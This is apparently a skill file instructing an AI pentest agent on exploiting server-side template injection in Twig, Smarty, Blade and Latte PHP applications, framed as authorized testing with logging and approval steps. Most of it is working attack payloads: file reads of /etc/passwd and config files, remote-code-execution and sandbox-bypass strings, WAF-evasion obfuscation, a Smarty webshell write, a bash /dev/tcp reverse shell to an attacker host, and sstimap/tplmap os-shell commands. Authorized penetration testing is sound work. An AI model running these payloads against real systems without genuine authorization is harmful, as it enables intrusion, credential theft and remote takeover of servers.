---
name: ssti-twig
description: >
  Guide Twig/PHP server-side template injection exploitation during authorized
  penetration testing.
keywords:
  - Twig SSTI
  - PHP template injection
  - Smarty SSTI
  - Blade SSTI
  - Latte SSTI
  - "{{7*'7'}} returns 49"
  - Symfony template injection
  - Laravel template injection
  - PHP sandbox escape
tools:
  - burpsuite
  - sstimap
  - tplmap
opsec: medium
---

# Twig / PHP SSTI

You are helping a penetration tester exploit server-side template injection in a
PHP application. The target uses Twig (Symfony), Smarty, Blade (Laravel), or
Latte and processes attacker-controlled input through the template engine without
proper sanitization. The goal is to escalate from template expression evaluation
to remote code execution or file access. All testing is under explicit written
authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Identify the engine and version, confirm
  code execution, demonstrate RCE. Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  RCE achieved, data extracted, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] ssti-twig → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `ssti-twig-rce-output.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[ssti-twig] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] ssti-twig → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Confirmed template expression evaluation: `{{7*7}}` returns `49`
- If `{{7*'7'}}` returns `49`, the engine is Twig. If it returns `7777777`,
  route to **ssti-jinja2**.
- If `{$smarty.version}` returns a version number, the engine is Smarty.
- If `{var $X="POC"}{$X}` works with single-brace syntax, check for Latte.

## Step 1: Assess

If not already provided, determine:
1. **Framework** — Symfony, Laravel, CraftCMS, Grav, or custom
2. **Template engine** — Twig, Smarty, Blade, Latte
3. **Engine version** — critical for payload selection (Twig < 1.20, 1.x, 2.x, 3.x)
4. **Injection point** — URL param, form field, email template, PDF generation

Skip if context was already provided.

## Step 2: Engine Identification

### Twig (Symfony/CraftCMS/Grav)

```php
{{7*7}}          # 49
{{7*'7'}}        # 49 (arithmetic, not string repetition = Twig, not Jinja2)
{{dump(app)}}    # Dumps the application object (Symfony)
{{dump(_context)}}  # Dumps all template variables
{{app.request.server.all|join(',')}}  # Server variables
```

### Smarty

```php
{$smarty.version}    # Version disclosure
{system('id')}       # Direct code execution (v3, deprecated in v5)
{php}echo `id`;{/php}  # Deprecated in v3
```

### Blade (Laravel)

```php
{{ 7*7 }}        # 49 (Blade uses {{ }} for escaped output)
{!! 7*7 !!}      # 49 (unescaped output)
```

### Latte

```php
{var $X="POC"}{$X}   # Variable assignment and output
{php system('id')}    # Direct code execution
```

## Step 3: Information Extraction (Twig)

### Application Info

```php
{{_self}}                        # Reference to current template
{{_self.env}}                    # Twig environment object
{{app.request.server.all|join(',')}}  # All server variables
{{dump(_context)}}               # All template variables
```

### File Reading

```php
{{ '/etc/passwd'|file_excerpt(1,30) }}
{{ include("wp-config.php") }}
{{ source('/etc/passwd') }}
```

## Step 4: RCE — Twig

### filter() / map() / sort() / reduce() (Twig >= 2.x, 3.x)

These are the most reliable modern payloads:

```php
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
{{ ['id',1]|sort('system')|join }}
{{ [0]|reduce('system','id') }}
{{ ['id']|filter('passthru') }}
{{ ['id']|map('passthru') }}
```

**With space or special character bypass:**

```php
{{ ['cat\x20/etc/passwd']|filter('system') }}
{{ ['cat$IFS/etc/passwd']|filter('system') }}
```

### registerUndefinedFilterCallback (Twig <= 1.19)

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("whoami") }}
```

### call_user_func (Twig >= 1.41 / >= 2.10 / >= 3.0)

```php
{{ {'id':'shell_exec'}|map('call_user_func')|join }}
```

### Error suppression for automation

```php
{{ ["error_reporting", "0"]|sort("ini_set") }}
```

### Via Symfony request object

```php
# Email parameter passing FILTER_VALIDATE_EMAIL:
"{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
# With GET param: ?0=id
```

## Step 5: Blind / Error-Based SSTI (Twig)

### Error-Based RCE (<= 1.19)

```php
{{ _self.env.registerUndefinedFilterCallback("shell_exec") }}
{%include ["Y:/A:/", _self.env.getFilter("id")]|join%}
```

### Error-Based RCE (>= 1.41 / >= 2.10 / >= 3.0)

```php
{{ [0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join) }}
```

### Boolean-Based RCE (<= 1.19)

```php
{{ _self.env.registerUndefinedFilterCallback("shell_exec") }}
{{ 1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString") }}
```

### Boolean-Based RCE (>= 1.41 / >= 2.10 / >= 3.0)

```php
{{ 1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString") }}
```

### Sandbox bypass via CVE-2022-23614

```php
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }}
```

## Step 6: RCE — Other PHP Engines

### Smarty (< v5)

```php
{system('id')}
{system('cat /etc/passwd')}
```

Smarty v3 with `{php}` tag (deprecated):
```php
{php}echo `id`;{/php}
```

Write webshell (if write access):
```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Blade (Laravel)

Blade escapes output by default. Exploitation requires unescaped output context
or framework-level misconfiguration:

```php
{{ system('id') }}    # Only if developer disabled escaping
```

### Latte

```php
{php system('id')}
```

## Step 7: Obfuscation / Filter Bypass (Twig)

### String construction via block + charset

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

### Using _context variable (requires double-rendering)

```twig
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```

### Filename injection via offset

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

### Smarty obfuscation (using `cat` modifier)

```php
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

## Step 8: Escalate or Pivot

### Reverse Shell via MCP

When RCE is confirmed, **prefer catching a reverse shell via the MCP
shell-server** over continuing to inject commands through Twig template
payloads.

1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
2. Send a reverse shell payload through the SSTI injection point:
   ```bash
   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
   ```
3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
4. Use `send_command()` for all subsequent commands

If the target lacks outbound connectivity, continue with inline command
execution and note the limitation in state.md.

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Got RCE + shell stabilized**: STOP. Return to orchestrator recommending
  **linux-discovery** or **windows-discovery** (based on target OS). Pass:
  hostname, current user, shell session ID, access method, current mode.
- **Got file read**: Extract config files (`wp-config.php`, `.env`,
  `config/database.php`, `parameters.yml`)
- **Got Symfony debug**: Access `/_profiler` for request history, credentials
- **Found SQLi in the app**: Route to **sql-injection-error** or **sql-injection-union**
- **PDF generation endpoint**: Try SSTI in PDF context (wkhtmltopdf, Puppeteer)
- **Email template**: Blind SSTI — use OOB callback to confirm execution

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: confirmed engine + version, injection point, working
payload, filter restrictions, current mode.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)
- Update `engagement/state.md` Blocked section before returning

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Update state.md Blocked section, return findings to the
  orchestrator. Do not retry the same technique — the orchestrator will
  decide whether to revisit with new context or route elsewhere.

## OPSEC Notes

- SSTI payloads execute server-side — appear in application logs and error logs
- `system()` / `exec()` / `passthru()` create process artifacts
- Twig `filter('system')` payloads are short and less likely to trigger WAF
- Smarty `{system()}` is very obvious — prefer Twig-style if both are available
- Cleanup: no persistent artifacts unless you wrote files (webshell, config)

## Troubleshooting

### `filter('system')` Returns Empty

- PHP `disable_functions` in php.ini may block `system()`, `exec()`, `passthru()`
- Try alternatives: `shell_exec`, `popen`, `proc_open`
- Check: `{{ ['phpinfo()']|filter('assert') }}` to see disabled functions
- Try `{{ ['cat /etc/passwd']|filter('system') }}` vs `{{ ['id']|map('passthru') }}`

### registerUndefinedFilterCallback Not Available

- Only works in Twig <= 1.19 — check version with `{{ constant('Twig\\Environment::VERSION') }}`
- For Twig 2.x/3.x, use `filter()`, `map()`, `sort()`, or `reduce()`

### Twig Sandbox Enabled

- Sandbox restricts available filters, functions, and methods
- Check for CVE-2022-23614 (sandbox bypass via `sort`)
- Try `{{ dump(_context) }}` to see what's available in the sandbox
- Try accessing `_self.env` — some sandbox configs don't restrict it

### WAF Blocking Payloads

- Use hex escapes: `\x20` for space, `\x2f` for `/`
- Use `$IFS` as shell space substitute in commands
- Twig `map` payloads are typically shorter and less flagged than `filter`
- Try splitting payload across multiple parameters

### Automated Tools

```bash
# SSTImap
python3 sstimap.py -u 'https://TARGET/page?name=test' -s

# tplmap
python2.7 tplmap.py -u 'https://TARGET/page?name=test*' --os-shell

# TInjA
tinja url -u "https://TARGET/page?name=test"
```
